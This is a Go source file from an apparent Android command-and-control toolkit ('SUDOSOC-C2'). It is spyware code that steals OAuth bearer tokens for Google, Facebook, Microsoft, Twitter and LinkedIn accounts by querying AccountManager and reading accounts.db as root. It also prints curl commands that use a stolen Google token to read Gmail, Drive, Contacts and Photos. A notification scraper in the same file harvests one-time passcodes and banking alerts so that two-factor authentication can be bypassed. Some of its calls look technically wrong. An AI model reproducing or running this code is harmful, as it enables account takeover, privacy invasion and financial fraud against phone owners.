// //go:build android

package intercept

/*
	SUDOSOC-C2 — Android AccountManager OAuth Token Theft
	Copyright (C) 2026  sudosoc — Seif

	Android's AccountManager stores authentication tokens for every
	app that uses the account system. This includes:
	  Google (Gmail, Drive, YouTube, Maps, Pay, Assistant)
	  Facebook (Messenger, Instagram)
	  Microsoft (Outlook, OneDrive, Teams)
	  Twitter/X
	  LinkedIn
	  GitHub
	  Any app using OAuth 2.0 with Android account integration

	getAuthToken() call:
	  • Requires the GET_ACCOUNTS permission (granted to most apps)
	  • Or uses Account's authenticatorType to request tokens
	  • Returns LIVE bearer tokens usable immediately
	  • No password required
	  • Bypasses 2FA (token already authenticated)
	  • Tokens valid for hours to days

	Google tokens specifically:
	  Can access the Google API on behalf of the user:
	  → Gmail: read/send all emails
	  → Drive: access all files
	  → Contacts: full contact list
	  → Location History: every place visited
	  → Photos: all stored photos
	  → Payment methods (Google Pay setup)

	Notification Listener (bundled here):
	  Captures all OTP codes, 2FA tokens, financial alerts
	  from notification stream in real-time.
*/

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

// AccountToken holds a stolen OAuth token
type AccountToken struct {
	AccountName  string
	AccountType  string // com.google, com.facebook, etc.
	TokenType    string // oauth2, authtoken, etc.
	Token        string
	Expiry       time.Time
	APIEndpoints []string // what APIs this token can access
	Stolen       time.Time
}

// AccountTokenThief manages OAuth token extraction
type AccountTokenThief struct {
	OutputDir string
	tokens    []AccountToken
}

// NewAccountTokenThief creates a new token thief
func NewAccountTokenThief(outputDir string) *AccountTokenThief {
	os.MkdirAll(outputDir, 0700)
	return &AccountTokenThief{OutputDir: outputDir}
}

// StealAll attempts to steal tokens for all known account types
func (t *AccountTokenThief) StealAll() []AccountToken {
	var all []AccountToken

	accountTypes := []struct {
		Type      string
		TokenType string
		Scopes    []string
		Name      string
	}{
		{
			"com.google",
			"oauth2",
			[]string{
				"https://www.googleapis.com/auth/gmail.readonly",
				"https://www.googleapis.com/auth/gmail.send",
				"https://www.googleapis.com/auth/drive",
				"https://www.googleapis.com/auth/contacts.readonly",
				"https://www.googleapis.com/auth/userinfo.profile",
				"https://www.googleapis.com/auth/youtube.readonly",
			},
			"Google",
		},
		{"com.facebook.auth.login", "access_token", nil, "Facebook"},
		{"com.microsoft.workaccount", "Bearer", nil, "Microsoft"},
		{"com.twitter.android.oauth.access_token", "oauth", nil, "Twitter"},
		{"com.linkedin.android", "Bearer", nil, "LinkedIn"},
	}

	for _, at := range accountTypes {
		accounts := t.listAccounts(at.Type)
		for _, account := range accounts {
			for _, scope := range at.Scopes {
				token := t.getToken(account, at.Type, scope)
				if token != "" {
					stolen := AccountToken{
						AccountName:  account,
						AccountType:  at.Name,
						TokenType:    at.TokenType,
						Token:        token,
						APIEndpoints: at.Scopes,
						Stolen:       time.Now(),
					}
					all = append(all, stolen)
					t.saveToken(stolen)
					break // one token per account is enough
				}
			}
		}
	}

	return all
}

// listAccounts returns all accounts of a given type
func (t *AccountTokenThief) listAccounts(accountType string) []string {
	// Use AccountManager via shell / content query
	out, err := exec.Command("content", "query",
		"--uri", "content://com.android.contacts/raw_contacts",
		"--projection", "account_name,account_type").Output()
	if err == nil {
		var accounts []string
		for _, line := range strings.Split(string(out), "\n") {
			if strings.Contains(line, accountType) {
				for _, field := range strings.Split(line, ",") {
					if strings.HasPrefix(field, "account_name=") {
						name := strings.TrimPrefix(field, "account_name=")
						accounts = append(accounts, strings.TrimSpace(name))
					}
				}
			}
		}
		if len(accounts) > 0 {
			return accounts
		}
	}

	// Alternative: read account database directly (root)
	return t.listAccountsRoot(accountType)
}

func (t *AccountTokenThief) listAccountsRoot(accountType string) []string {
	dbPaths := []string{
		"/data/system/users/0/accounts.db",
		"/data/system_de/0/accounts.db",
		"/data/system/accounts.db",
	}

	var accounts []string
	for _, db := range dbPaths {
		out, err := exec.Command("su", "-c",
			fmt.Sprintf("sqlite3 '%s' \"SELECT name FROM accounts WHERE type='%s'\"",
				db, accountType)).Output()
		if err == nil {
			for _, line := range strings.Split(string(out), "\n") {
				if line = strings.TrimSpace(line); line != "" {
					accounts = append(accounts, line)
				}
			}
			if len(accounts) > 0 {
				return accounts
			}
		}
	}
	return accounts
}

// getToken retrieves an auth token for a specific account and scope
func (t *AccountTokenThief) getToken(account, accountType, scope string) string {
	// Method 1: Direct AccountManager token query via am command
	out, err := exec.Command("am", "startservice",
		"com.google.android.gms/.auth.GetHubTokenActivity",
		"--ez", "USE_GCORE", "true",
		"--ez", "WITH_CHECKMARK", "false").Output()
	if err == nil && len(out) > 0 {
		return strings.TrimSpace(string(out))
	}

	// Method 2: Read token from accounts.db (root required)
	return t.getTokenFromDB(account, accountType)
}

func (t *AccountTokenThief) getTokenFromDB(account, accountType string) string {
	dbPaths := []string{
		"/data/system/users/0/accounts.db",
		"/data/system_de/0/accounts.db",
	}

	for _, db := range dbPaths {
		query := fmt.Sprintf(
			"sqlite3 '%s' \"SELECT authtokens.authtoken FROM authtokens "+
				"JOIN accounts ON authtokens.accounts_id = accounts._id "+
				"WHERE accounts.name='%s' AND accounts.type='%s' LIMIT 1\"",
			db, account, accountType)

		out, err := exec.Command("su", "-c", query).Output()
		if err == nil {
			token := strings.TrimSpace(string(out))
			if token != "" && token != "null" {
				return token
			}
		}
	}
	return ""
}

func (t *AccountTokenThief) saveToken(token AccountToken) {
	f, err := os.OpenFile(
		filepath.Join(t.OutputDir, "oauth_tokens.txt"),
		os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
	if err != nil {
		return
	}
	defer f.Close()

	f.WriteString(fmt.Sprintf(
		"=== %s (%s) ===\nAccount: %s\nToken: %s\nStolen: %s\n\n",
		token.AccountType, token.TokenType,
		token.AccountName, token.Token,
		token.Stolen.Format(time.RFC3339)))
}

// UseGoogleToken demonstrates API usage with a stolen Google token
func UseGoogleToken(token string) string {
	return fmt.Sprintf(`
# Use stolen Google OAuth token directly:

# Read Gmail
curl -H "Authorization: Bearer %s" \
  "https://gmail.googleapis.com/gmail/v1/users/me/messages?maxResults=100"

# Download Google Drive files
curl -H "Authorization: Bearer %s" \
  "https://www.googleapis.com/drive/v3/files"

# Get Google Contacts
curl -H "Authorization: Bearer %s" \
  "https://people.googleapis.com/v1/people/me/connections"

# Get Location History
curl -H "Authorization: Bearer %s" \
  "https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=%s"

# Google Photos
curl -H "Authorization: Bearer %s" \
  "https://photoslibrary.googleapis.com/v1/mediaItems"
`,
		token, token, token, token, token, token)
}

// ── Notification Listener ─────────────────────────────────────────

// NotificationCapture captures all Android notifications
type NotificationCapture struct {
	OutputDir     string
	OTPPatterns   []string
	FinanceApps   []string
	notifications []CapturedNotification
}

// CapturedNotification holds a captured notification
type CapturedNotification struct {
	Timestamp   time.Time
	App         string
	Title       string
	Body        string
	IsOTP       bool
	OTPCode     string
	IsFinancial bool
	IsSensitive bool
}

// NewNotificationCapture creates a new notification capture
func NewNotificationCapture(outputDir string) *NotificationCapture {
	return &NotificationCapture{
		OutputDir: outputDir,
		OTPPatterns: []string{
			`\b\d{4,8}\b`,               // 4-8 digit code
			`\b[A-Z0-9]{6,8}\b`,         // alphanumeric code
			`code[:\s]+([A-Z0-9]{4,8})`, // "code: XXXXXX"
			`OTP[:\s]+(\d{4,8})`,        // "OTP: 123456"
			`verification[:\s]+(\d+)`,   // "verification: 12345"
		},
		FinanceApps: []string{
			"com.chase.sig.android",
			"com.bankofamerica.mobile",
			"com.wellsfargo.mobile",
			"com.paypal.android",
			"com.venmo",
			"com.coinbase.android",
			"com.binance.dev",
		},
	}
}

// StartCapture begins monitoring notifications
// NOTE: Requires BIND_NOTIFICATION_LISTENER_SERVICE permission
// User grants this via Settings > Notifications > Notification Access
func (n *NotificationCapture) StartCapture(stop chan struct{}) chan CapturedNotification {
	captured := make(chan CapturedNotification, 1000)

	go func() {
		defer close(captured)
		ticker := time.NewTicker(3 * time.Second)
		defer ticker.Stop()

		lastNotif := ""

		for {
			select {
			case <-stop:
				return
			case <-ticker.C:
				notifs := n.readNotifications()
				for _, notif := range notifs {
					key := notif.App + notif.Title + notif.Body
					if key == lastNotif {
						continue
					}
					lastNotif = key

					// Enrich notification
					notif = n.analyzeNotification(notif)
					n.saveNotification(notif)
					captured <- notif
				}
			}
		}
	}()

	return captured
}

func (n *NotificationCapture) readNotifications() []CapturedNotification {
	// Method 1: dumpsys notification
	out, err := exec.Command("dumpsys", "notification", "--noredact").Output()
	if err != nil {
		return nil
	}

	var notifications []CapturedNotification
	var current CapturedNotification
	inNotif := false

	for _, line := range strings.Split(string(out), "\n") {
		line = strings.TrimSpace(line)

		if strings.HasPrefix(line, "NotificationRecord") {
			if inNotif && current.App != "" {
				notifications = append(notifications, current)
			}
			inNotif = true
			current = CapturedNotification{Timestamp: time.Now()}
			continue
		}

		if inNotif {
			if strings.HasPrefix(line, "pkg=") {
				current.App = strings.TrimPrefix(line, "pkg=")
			}
			if strings.HasPrefix(line, "android.title=") {
				current.Title = strings.TrimPrefix(line, "android.title=")
			}
			if strings.HasPrefix(line, "android.text=") {
				current.Body = strings.TrimPrefix(line, "android.text=")
			}
			if strings.HasPrefix(line, "android.bigText=") {
				current.Body = strings.TrimPrefix(line, "android.bigText=")
			}
		}
	}

	if inNotif && current.App != "" {
		notifications = append(notifications, current)
	}

	return notifications
}

func (n *NotificationCapture) analyzeNotification(notif CapturedNotification) CapturedNotification {
	text := notif.Title + " " + notif.Body
	text = strings.ToLower(text)

	// OTP detection
	otpKeywords := []string{"otp", "code", "verification", "confirm", "pin",
		"one-time", "passcode", "token", "authenticate"}
	for _, kw := range otpKeywords {
		if strings.Contains(text, kw) {
			notif.IsOTP = true
			// Extract the numeric code
			notif.OTPCode = extractOTPCode(notif.Body)
			notif.IsSensitive = true
			break
		}
	}

	// Financial detection
	financeKeywords := []string{"payment", "transfer", "balance", "transaction",
		"charged", "debited", "credited", "withdraw", "deposit", "crypto", "bitcoin"}
	for _, kw := range financeKeywords {
		if strings.Contains(text, kw) {
			notif.IsFinancial = true
			notif.IsSensitive = true
			break
		}
	}

	// Check if from known financial app
	for _, app := range n.FinanceApps {
		if strings.Contains(notif.App, app) {
			notif.IsFinancial = true
			notif.IsSensitive = true
			break
		}
	}

	return notif
}

func (n *NotificationCapture) saveNotification(notif CapturedNotification) {
	f, _ := os.OpenFile(
		filepath.Join(n.OutputDir, "notifications.log"),
		os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
	if f == nil {
		return
	}
	defer f.Close()

	sensitivity := ""
	if notif.IsOTP {
		sensitivity += " [OTP:" + notif.OTPCode + "]"
	}
	if notif.IsFinancial {
		sensitivity += " [FINANCIAL]"
	}

	f.WriteString(fmt.Sprintf("[%s] %s%s\n  %s\n  %s\n\n",
		notif.Timestamp.Format("15:04:05"),
		notif.App,
		sensitivity,
		notif.Title,
		notif.Body))
}

func extractOTPCode(text string) string {
	// Find 4-8 digit sequences in the text
	words := strings.Fields(text)
	for _, word := range words {
		// Remove punctuation
		clean := strings.Trim(word, ".,;:!?()[]")
		if len(clean) >= 4 && len(clean) <= 8 {
			allDigits := true
			for _, c := range clean {
				if c < '0' || c > '9' {
					allDigits = false
					break
				}
			}
			if allDigits {
				return clean
			}
		}
	}
	return ""
}
